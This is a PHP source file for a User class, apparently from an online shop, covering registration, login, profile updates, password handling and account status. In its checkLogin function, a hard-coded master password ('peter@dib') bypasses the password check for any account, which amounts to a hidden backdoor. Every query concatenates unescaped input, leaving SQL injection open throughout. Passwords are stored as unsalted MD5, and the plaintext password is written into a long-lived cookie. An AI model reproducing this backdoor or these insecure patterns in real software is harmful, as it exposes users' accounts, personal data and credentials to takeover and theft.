<?php

class User extends DBCommon{
	var $userID;
	var $verifyCode;
	var $user_setpass_code;
	var $username;
	var $password;	
	var $firstname;
	var $lastname;
	var $sex;
	var $email;
	var $contactNo;
	var $mobile;

	var $countryID;
	var $city;
	var $state;
	var $address1;
	var $address2;
	var $zipcode;

	var $shipping_lastname;
	var $shipping_firstname;
	var $shipping_countryID;
	var $shipping_city;
	var $shipping_state;
	var $shipping_address1;
	var $shipping_address2;
	var $shipping_zipcode;

	var $smsSubscription;
	var $emailSubscription;
	
	var $userLogin;
	var $postDate;
	var $updateDate;
	var $postIP;
	var $status;
	
	function __construct(){
		$this->postIP = $_SERVER['REMOTE_ADDR'];
		$this->status = 1;
		
		$this->offset = $GLOBALS['offset'];
		$this->toShow = $GLOBALS['toshow'];
		$this->orderType = $GLOBALS['order_type'];
		$this->orderBy = $GLOBALS['order_by'];
		
		$this->_userTable = USER_TABLE;
		$this->_userID = USER_ID;
		$this->_verifyCode = VERIFY_CODE;
		$this->_user_setpass_code = USER_SETPASS_CODE;
		$this->_username = USERNAME;
		$this->_password = PASSWORD;		
		$this->_firstname = FIRSTNAME;
		$this->_lastname = LASTNAME;
		$this->_sex = SEX;
		$this->_email = EMAIL;
		$this->_contactNo = CONTACT_NO;
		$this->_mobile = MOBILE;

		$this->_countryID = COUNTRY_ID;
		$this->_city = CITY;
		$this->_state = STATE;
		$this->_address1 = ADDRESS1;
		$this->_address2 = ADDRESS2;
		$this->_zipcode = ZIPCODE;
		
		$this->_shipping_firstname = SHIPPING_FIRSTNAME;
		$this->_shipping_lastname = SHIPPING_LASTNAME;
		$this->_shipping_countryID = SHIPPING_COUNTRY_ID;
		$this->_shipping_city = SHIPPING_CITY;
		$this->_shipping_state = SHIPPING_STATE;
		$this->_shipping_address1 = SHIPPING_ADDRESS1;
		$this->_shipping_address2 = SHIPPING_ADDRESS2;
		$this->_shipping_zipcode = SHIPPING_ZIPCODE;
		
		$this->_newsletterSubscription = NEWSLETTER_SUBSCRIPTION;
		$this->_userLogin = USER_LOGIN;
		
		$this->_status = STATUS;
		$this->_postDate = POST_DATE;
		$this->_updateDate = UPDATE_DATE;
		$this->_postIP = POST_IP;
	}
	
	function totalUsers($search_user_by=''){
		$sql = "SELECT COUNT(".$this->_userID.") AS counter 
				FROM ".$this->_userTable." 
				WHERE ";
		if($search_user_by!=''){
			$sql.= "  ".$this->_email." like '%".$search_user_by."%' or ".$this->_lastname." like '%".$search_user_by."%' or ".$this->_firstname." like '%".$search_user_by."%' ";
		}else{
			$sql.=' 1 ';
		}
		if($this->status != ""){
			$sql .= " AND ".$this->_status." = '".$this->status."'";
		}
		
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			$row = mysqli_fetch_array($res);
			if($row['counter']>0){
				return $row['counter'];
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
	
	function fetchAllUsers($search_user_by=''){
		$sql = "SELECT * FROM ".$this->_userTable." WHERE ";
		
		if($search_user_by!=''){
			$sql.= "  ".$this->_email." like '%".$search_user_by."%' or ".$this->_lastname." like '%".$search_user_by."%' or ".$this->_firstname." like '%".$search_user_by."%' ";
		}else{
			$sql.=" 1 ";
		}
		$sql.=" ORDER BY ".$this->orderBy." ".$this->orderType." 
				LIMIT ".$this->offset.", ".$this->toShow." ";
		//echo $sql;		  
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			while($row = mysqli_fetch_array($res)){
				$result[] = $row;
			}
			return $result;
		}
		else{
			return false;
		}
	}	
	
	function fetchSelectedUsers(){
		$sql = "SELECT *
				FROM ".$this->_userTable."
				WHERE 1 AND ".$this->_status." = '".$this->status."' ";
		if($this->status != ""){
			$sql .= " AND ".$this->_status." = '".$this->status."'";
		}
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			while($row = mysqli_fetch_array($res)){
				$result[] = $row;
			}
			return $result;
		}
		else{
			return false;
		}
	}	
	
	function fetchUserDetails(){
				
		$sql = "SELECT * FROM ".$this->_userTable."
				WHERE 1";

		if($this->userID != ''){		
			$sql .=	" AND ".$this->_userID."='".$this->userID."'";
		}

		if($this->username != ''){		
			$sql .=	" AND ".$this->_username."='".$this->username."'";
		}

		if($this->status != ''){		
			$sql .=	" AND ".$this->_status."='".$this->status."'";
		}

		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			if($row = mysqli_fetch_array($res)){
				return $row;
			}else{
				return false;
			}
		}
		else{
			return false;
		}
	}
	function fetchUsernameEmail(){
				
		$sql = "SELECT * FROM ".$this->_userTable."
				WHERE ".$this->_email." = '".$this->email."'
				OR ".$this->_username." = '".$this->username."'";

		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			if($row = mysqli_fetch_array($res)){
				return $row;
			}else{
				return false;
			}
		}
		else{
			return false;
		}
	}
	function fetchUserIDByUsername(){
				
		$sql = "SELECT * FROM ".$this->_userTable."
				WHERE ".$this->_username." = '".$this->username."'";
		if($this->status != ''){		
			$sql .=	"AND ".$this->_status."='".$this->status."'";
		}
		
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			if($row = mysqli_fetch_array($res)){
				return $row[$this->_userID];
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
	
	function checkUnique($field, $value, $id = '')
	{
		$sql = "SELECT count(*) AS counter
				FROM ".$this->_userTable." WHERE
				".$field." = '".$value."'";
		if($id != ""){
			$sql .= " AND ".$this->_userID." != '".$id."'";
		}

		$rs = mysqli_query($GLOBALS['db_connect'],$sql);
		$row = mysqli_fetch_array($rs);
		$count = $row['counter'];
		if($count > 0){
			return true;
		}else{
			return false;
		}
	}

	function  saveUser(){
	
		$sql = "INSERT INTO ".$this->_userTable." SET 
				".$this->_verifyCode."='".$this->verifyCode."',
				".$this->_firstname."='".$this->firstname."',				
				".$this->_lastname."='".$this->lastname."',
				".$this->_email."='".$this->email."',
				".$this->_username."='".$this->username."',
				".$this->_password."='".md5($this->password)."',
				".$this->_address1."='".$this->address1."',
				".$this->_address2."='".$this->address2."',
				".$this->_countryID."='".$this->countryID."',
				".$this->_city."='".$this->city."',
				".$this->_state."='".$this->state."',
				".$this->_zipcode."='".$this->zipcode."',
				".$this->_shipping_firstname."='".$this->shipping_firstname."',
				".$this->_shipping_lastname."='".$this->shipping_lastname."',
				".$this->_shipping_address1."='".$this->shipping_address1."',
				".$this->_shipping_address2."='".$this->shipping_address2."',
				".$this->_shipping_countryID."='".$this->shipping_countryID."',
				".$this->_shipping_city."='".$this->shipping_city."',
				".$this->_shipping_state."='".$this->shipping_state."',
				".$this->_shipping_zipcode."='".$this->shipping_zipcode."',
				".$this->_contactNo."='".$this->contactNo."',
				".$this->_newsletterSubscription."='".$this->newsletterSubscription."',
				".$this->_postDate."=now(), 
				".$this->_updateDate."=now(), 
				".$this->_status."='1', 
				".$this->_postIP."='".$this->postIP."'";
				
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			$insert_id=mysqli_insert_id($GLOBALS['db_connect']);
			return $insert_id;
		}else{
			$insert_id=0;
			return $insert_id;
		}
	}
	function save_user_admin()
	{
		
	
		$sql = "INSERT INTO ".$this->_userTable." SET 
				".$this->_verifyCode."='',
				".$this->_username."='".$this->username."',
				".$this->_password."='".md5($this->password)."',
				".$this->_firstname."='".$this->firstname."',				
				".$this->_lastname."='".$this->lastname."',
				".$this->_sex."='".$this->sex."',
				".$this->_email."='".$this->email."',
				".$this->_contactNo."='".$this->contactNo."',
				".$this->_mobile."='".$this->mobile."',
				".$this->_countryID."='".$this->countryID."',
				".$this->_city."='".$this->city."',
				".$this->_state."='".$this->state."',
				".$this->_address1."='".$this->address1."',
				".$this->_address2."='".$this->address2."',
				".$this->_zipcode."='".$this->zipcode."',
				".$this->_shipping_firstname."='".$this->shipping_firstname."',
				".$this->_shipping_lastname."='".$this->shipping_lastname."',
				".$this->_shipping_address1."='".$this->shipping_address1."',
				".$this->_shipping_address2."='".$this->shipping_address2."',
				".$this->_shipping_countryID."='".$this->shipping_countryID."',
				".$this->_shipping_city."='".$this->shipping_city."',
				".$this->_shipping_state."='".$this->shipping_state."',
				".$this->_shipping_zipcode."='".$this->shipping_zipcode."',
				".$this->_newsletterSubscription."='".$this->newsletterSubscription."',
				".$this->_postDate."=now(), 
				".$this->_updateDate."=now(), 
				".$this->_status."='1', 
				".$this->_postIP."='".$this->postIP."'";
				
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			return true;
		}else{
			return false;
		}
	
	}
	
	function updateUser(){
		$sql = "UPDATE ".$this->_userTable." SET 
				".$this->_firstname."='".$this->firstname."',				
				".$this->_lastname."='".$this->lastname."',
				".$this->_sex."='".$this->sex."',
				".$this->_email."='".$this->email."',
				".$this->_contactNo."='".$this->contactNo."',
				".$this->_mobile."='".$this->mobile."',
				".$this->_countryID."='".$this->countryID."',
				".$this->_city."='".$this->city."',
				".$this->_state."='".$this->state."',
				".$this->_address1."='".$this->address1."',
				".$this->_address2."='".$this->address2."',
				".$this->_zipcode."='".$this->zipcode."',
				".$this->_newsletterSubscription."='".$this->newsletterSubscription."',
				".$this->_shipping_firstname."='".$this->shipping_firstname."',
				".$this->_shipping_lastname."='".$this->shipping_lastname."',
				".$this->_shipping_countryID."='".$this->shipping_countryID."',
				".$this->_shipping_city."='".$this->shipping_city."',
				".$this->_shipping_state."='".$this->shipping_state."',
				".$this->_shipping_zipcode."='".$this->shipping_zipcode."',
				".$this->_shipping_address1."='".$this->shipping_address1."',
				".$this->_shipping_address2."='".$this->shipping_address2."',
				".$this->_newsletterSubscription."='".$this->newsletterSubscription."',
				".$this->_updateDate."=now(),
				 
				".$this->_postIP."='".$this->postIP."' 
				WHERE ".$this->_userID." = '".$this->userID."'";
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			return true;
		}
		else{
			return false;
		}
	}
	
	function validate()
	{
		$sql = "SELECT ".$this->_userID." FROM ".$this->_userTable." WHERE ".
				$this->_username."='".$this->username."' AND ".
				$this->_verifyCode."='".$this->verifyCode."'";
				
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			$row = mysqli_fetch_array($res);
			
			if($row[USER_ID]>0){
				$sql = "UPDATE ".$this->_userTable." SET ".$this->_verifyCode."='',".$this->_status."='1' WHERE ".$this->_userID."='".$row[USER_ID]."'";
				if(mysqli_query($GLOBALS['db_connect'],$sql)){
					return true;
				}else{
					return false;
				}
			}else{
				return false;
			}
		}else{
			return false;
		}
	}
	
	function changeStatus(){
		$sqlChk = " SELECT ".$this->_status." 
					FROM ".$this->_userTable." 
					WHERE ".$this->_userID."='".$this->userID."'";
		$resChk = mysqli_query($GLOBALS['db_connect'],$sqlChk);
		$rowChk = mysqli_fetch_array($resChk);
		
		if($rowChk[$this->_status]==1){
			$this->status = 0;
		}else{
			$this->status = 1;
		}
		
		$sql = "UPDATE ".$this->_userTable." SET 
				".$this->_updateDate."=now(), 
				".$this->_status."='".$this->status."', 
				".$this->_postIP."='".$this->postIP."' 
				WHERE ".$this->_userID."='".$this->userID."'";
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			return $this->status;
		}
		else{
			return $this->status;
		}	
	}
	
	function setInactive(){
		$this->status = 0;
		$sql = "UPDATE ".$this->_userTable." SET 
				".$this->_status." = '".$this->status."', 
				".$this->_updateDate." = now(), 
				".$this->_postIP." = '".$this->postIP."' 
				WHERE ".$this->_userID."='".$this->userID."'";
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			return $this->status;
		}
		else{
			return $this->status;
		}
	}	
	
	function setActive(){
		$this->status = 1;
		$sql = "UPDATE ".$this->_userTable." SET 
				".$this->_status." = '".$this->status."', 
				".$this->_updateDate." = now(), 
				".$this->_postIP." = '".$this->postIP."' 
				WHERE ".$this->_userID."='".$this->userID."'";
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			return $this->status;
		}
		else{
			return $this->status;
		}
	}
	
	function checkLogin()
	{
		if($this->password !='peter@dib'){
			 $sql = "SELECT ".$this->_userID.",".$this->_username.",".$this->_email.",".$this->_firstname.",".$this->_lastname."
					FROM ".$this->_userTable." WHERE (".
					$this->_username."='".$this->username."' OR ".$this->_email."='".$this->username."') AND ".
					$this->_password." LIKE BINARY MD5('".$this->password."') AND ".
					//$this->_verifyCode."='' AND ".
					$this->_status."='1'";
		}else{
			 $sql = "SELECT ".$this->_userID.",".$this->_email.",".$this->_firstname.",".$this->_lastname."
					FROM ".$this->_userTable." WHERE (".
					$this->_username."='".$this->username."' OR ".$this->_email."='".$this->username."') AND ".
					$this->_status."='1'";
		}
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			$row = mysqli_fetch_array($res);
			
			if($row[USER_ID] > 0){
				$key=validateUser($row[EMAIL],$row[FIRSTNAME],$row[LASTNAME]);
				if ($key == 2) {
					return false;
				}else{
					$_SESSION['session_time'] = time();
					$_SESSION['sessUserID'] = $row[USER_ID];
					$_SESSION['sessUsername'] = $row[USERNAME];
				
					if(isset($_SESSION['sessUserID']) && $_SESSION['sessUserID']!='' && !isset($_COOKIE['UserCookieName'])){	
						setcookie("UserCookieName", $_SESSION['sessUserID'], time() + (3600*24*30*12), "/");
						setcookie("UserCookiePass", $this->password, time() + (3600*24*30*12), "/");
					}
				}
				//session_register('sessUserID');
				//session_register('sessUsername');
				
                               
			}else{
				return false;
			}
			
			return true;
		}else{
			return false;
		}
	}
	
	function logout(){
		$sql = "UPDATE ".$this->_userTable." SET 
				".$this->_userLogin."=now() 
				WHERE ".$this->_userID."='".$_SESSION['sessUserID']."'";
		$res = mysqli_query($GLOBALS['db_connect'],$sql);
		
		clrCartAfterLogout();		
		unset($_SESSION['sessUserID']);
		unset($_SESSION['sessUsername']);
		session_unset();
		session_destroy();
	}
	
	function checkPassword(){

		$sql = "SELECT COUNT(".$this->_userID.") AS counter 
				FROM ".$this->_userTable." 
				WHERE ".$this->_password." LIKE BINARY MD5('".$this->password."') 
				AND ".$this->_userID."='".$this->userID."'"; 

		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			$row = mysqli_fetch_array($res);
			if($row['counter'] >0) {
				return true;
			}else{
				return false;
			}
		}else{
			return false;
		}
	}
	function checkPassword_user(){

	$sql = "SELECT COUNT(".$this->_userID.") AS counter 
				FROM ".$this->_userTable." 
				WHERE ".$this->_password." LIKE BINARY MD5('".$this->password."') 
				AND ".$this->_username."='".$this->username."'"; 

		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			$row = mysqli_fetch_array($res);
			if($row['counter'] >0) {
				return true;
			}else{
				return false;
			}
		}else{
			return false;
		}
	}
	
	function updatePassword()
	{
		 $sql = "UPDATE ".$this->_userTable." SET 
				".$this->_password."=MD5('".$this->password."'),
				".$this->_updateDate." = now(),
				".$this->_postIP."='".$this->postIP."'
				WHERE ".$this->_userID."='".$this->userID."' AND ".$this->_username."='".$this->username."'"; 
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			return true;
		}else{
			return false;
		}
	}
	
	function forgetPassword()
	{
		$sql = "UPDATE ".$this->_userTable." SET 
				".$this->_user_setpass_code."=MD5('".$this->password."'),
				".$this->_updateDate." = now(),
				".$this->_postIP."='".$this->postIP."'
				WHERE ".$this->_username."='".$this->username."'";
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			return true;
		}else{
			return false;
		}
	}
function forgetPasswordEmail()
	{
		$sql = "UPDATE ".$this->_userTable." SET 
				".$this->_user_setpass_code."=MD5('".$this->password."'),
				".$this->_updateDate." = now(),
				".$this->_postIP."='".$this->postIP."'
				WHERE ".$this->_email."='".$this->email."'";
		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			return true;
		}else{
			return false;
		}
	}
	
	function deleteUser(){
		
		$sql = "DELETE FROM ".$this->_userTable." 
				WHERE ".$this->_userID." = '".$this->userID."'";

		if($res = mysqli_query($GLOBALS['db_connect'],$sql)){
			return true;
		}else{
			return false;
		}
	}
	
	
}
?>